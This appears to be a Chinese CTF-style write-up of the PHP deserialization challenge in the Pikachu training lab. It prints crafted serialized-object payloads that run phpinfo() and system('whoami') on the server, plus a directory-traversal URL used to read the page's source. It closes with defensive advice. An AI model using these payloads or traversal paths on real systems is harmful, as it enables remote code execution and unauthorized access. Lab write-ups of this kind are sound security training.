## 题目: Pikachu PHP Unserialization - PHP 反序列化漏洞

## 题目描述
页面提供了一个接受序列化数据的 API 接口。要求利用 PHP 反序列化漏洞，构造恶意的序列化字符串，触发服务器端的代码执行。

## 解题思路
PHP 反序列化漏洞通常源于代码中使用了 `unserialize()` 函数去处理不可信的用户输入。攻击者可以构造包含恶意属性的对象序列化字符串。当对象被销毁或反序列化时，如果类中定义了魔术方法（如 `__destruct()` 或 `__wakeup()`），并且该方法中存在危险函数（如 `eval()`、`system()`），就会导致远程代码执行（RCE）。

## 解题步骤
**1. 纯黑盒盲打探测**
* 直接输入 `phpinfo();` 或 `O:1:"S":1:{s:4:"test";s:10:"phpinfo();";}` 进行盲打，观察页面是否执行。

**2. 利用目录遍历读取源码（黑盒转白盒）**
* 利用之前掌握的 `../../(目录遍历)` 漏洞，构造路径穿越 Payload，去读取反序列化页面的源码：
  `http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../vul/unserilization/unser.php`
* 成功获取源码后，分析出类名（如 `S`）以及 `__destruct` 魔术方法中调用的 `eval()` 函数。

**3. 构造 Payload 实施攻击**
* 根据源码结构，构造包含系统命令的序列化字符串：
  `O:1:"S":1:{s:4:"test";s:17:"system('whoami');";}`
* 将其输入到 API 接口中，成功触发魔术方法，服务器返回了当前用户名。

## 知识点总结
1. **魔术方法触发**：`__destruct()` 在对象被销毁时触发，是反序列化漏洞最常见的利用点。
2. **黑盒转白盒**：在无法直接分析序列化格式时，通过其他漏洞（如目录遍历）获取源码，是极其高效且合理的实战手法。
3. **防御策略**：绝不对不可信输入使用 `unserialize()`，推荐使用 `json_decode()`。如果必须使用，需限制允许反序列化的类。
